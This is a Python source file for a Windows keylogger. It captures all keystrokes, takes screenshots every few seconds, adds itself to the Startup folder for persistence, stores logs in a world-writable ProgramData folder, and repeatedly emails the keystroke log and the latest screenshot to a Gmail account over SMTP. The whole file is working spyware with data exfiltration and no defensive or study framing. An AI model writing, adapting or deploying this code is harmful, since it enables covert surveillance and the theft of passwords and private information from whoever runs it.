from pynput import keyboard
from datetime import date, datetime, timedelta
import pyautogui
import email, smtplib, ssl
import os
import win32com.client
import glob

from email import encoders
from email.mime.base import MIMEBase
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText

keys = []
curr_date = date.today()
date_str = curr_date.strftime("%d-%m-%Y")

def win_create_folder():
    # Path to the folder in ProgramData directory
    folder_path = os.path.join(os.environ['ProgramData'], 'logger')
    ss_path = os.path.join(folder_path, 'screenshots')
    logs_path = os.path.join(folder_path, 'logs')

    # Create the folder if it doesn't exist
    if not os.path.exists(folder_path):
        os.makedirs(folder_path)
        os.makedirs(ss_path)
        os.makedirs(logs_path)

    # Set the folder's access permissions to 0o777
    os.chmod(folder_path, 0o777)

    return folder_path

def win_replicate():
    # Get the path to the script's directory
    script_dir = os.path.dirname(os.path.abspath(__file__))

    # Get the path to the Startup folder
    startup_folder = os.path.join(os.environ['APPDATA'], 'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup')

    # Get the path to the Python script
    script_path = os.path.abspath(__file__)

    # Create a shortcut to the script in the Startup folder
    shortcut_path = os.path.join(startup_folder, 'MyScriptName.lnk')
    target_path = script_path
    icon_path = script_path # Set the icon path to the script path to use the script icon
    shell = win32com.client.Dispatch("WScript.Shell")
    shortcut = shell.CreateShortCut(shortcut_path)
    shortcut.Targetpath = target_path
    shortcut.IconLocation = icon_path
    shortcut.WorkingDirectory = script_dir # Set the working directory to the script's directory
    shortcut.save()

def on_press(key):
    keys.append(key)
    write_file(keys)

    try:
        print('alphanumeric key {0} pressed'.format(
            key.char))
    except AttributeError:
        print('special key {0} pressed'.format(
            key))

def on_release(key):
    print('{0} released'.format(
        key))
    if key == keyboard.Key.esc:
        # Stop listener
        return False
    
def write_file(keys):
    path = win_create_folder() 

    with open(f'{path}/logs/{date_str}.log', 'w') as f:
        for key in keys:
            # removing ''
            k = str(key).replace("'", "")
            f.write(k)
                     
            # explicitly adding a space after
            # every keystroke for readability
            f.write(' ')

def screenshot():
    path = win_create_folder()
    
    curr_date_time = datetime.now()
    dt_string = curr_date_time.strftime("%d-%m-%Y_%H-%M-%S")
    
    ss = pyautogui.screenshot()
    ss.save(f'{path}/screenshots/{dt_string}.jpg')

win_replicate()

# Start up the listener
listener = keyboard.Listener(
    on_press=on_press,
    on_release=on_release)
listener.start()

# Initialize timekeeping variables for screenshots and email
last_ss_time = datetime.utcnow()
last_email_time = datetime.utcnow()

# initialize some timeframes
screenshot_interval = 5
email_interval = 60 * 0.2

# Main loop to check timestamps for screenshots and email sending
while True:
    curr_time = datetime.utcnow()
    # print(curr_time - last_ss_time)
    
    # Check if it's time to screenshot
    if (curr_time - last_ss_time) > timedelta(seconds=screenshot_interval):
        print("Taking screenshot...")
        screenshot()
        last_ss_time = curr_time

    # Check if its time to email
    if (curr_time - last_email_time) > timedelta(seconds=email_interval):
        print("Sending email...")
        port = 465
        password = open("../.env").readlines()[0]
        sender_email = "codyschaefer22@gmail.com"
        recvr_email = "codyschaefer22@gmail.com"
        subject = f'{date_str}_{curr_time.strftime("%H-%M-%S")} Update'
        body = ""

        message = MIMEMultipart()
        message["From"] = sender_email
        message["To"] = recvr_email
        message["Subject"] = subject

        message.attach(MIMEText(body, "plain"))

        # Get the most recent screenshot file
        ss_files_list = glob.glob("C:/ProgramData/logger/screenshots/*")
        ss_filename_latest = max(ss_files_list, key=os.path.getctime)

        # Open and encode the attachment so it can be added to the email
        with open(ss_filename_latest, "rb") as attachment:
            part = MIMEBase("application", "octet-stream")
            part.set_payload(attachment.read())
        encoders.encode_base64(part)

        part.add_header(
            "Content-Disposition",
            f"attachment; filename= {ss_filename_latest}",
        )

        # Attach the screenshot
        message.attach(part)

        # Add the log for the day to the email
        logs_path = win_create_folder()
        with open(f'{logs_path}/logs/{date_str}.log', 'r') as log:
            part = MIMEBase("application", "octet-stream")
            part.set_payload(log.read())
        encoders.encode_base64(part)

        part.add_header(
            "Content-Disposition",
            f"attachment; filename= {date_str}.log",
        )

        # Attach the log
        message.attach(part)

        text = message.as_string()

        context = ssl.create_default_context()

        with smtplib.SMTP_SSL("smtp.gmail.com", port, context=context) as server:
            server.login("codyschaefer22@gmail.com", password)
            server.sendmail(sender_email, recvr_email, text)

        # Reset email time
        last_email_time = curr_time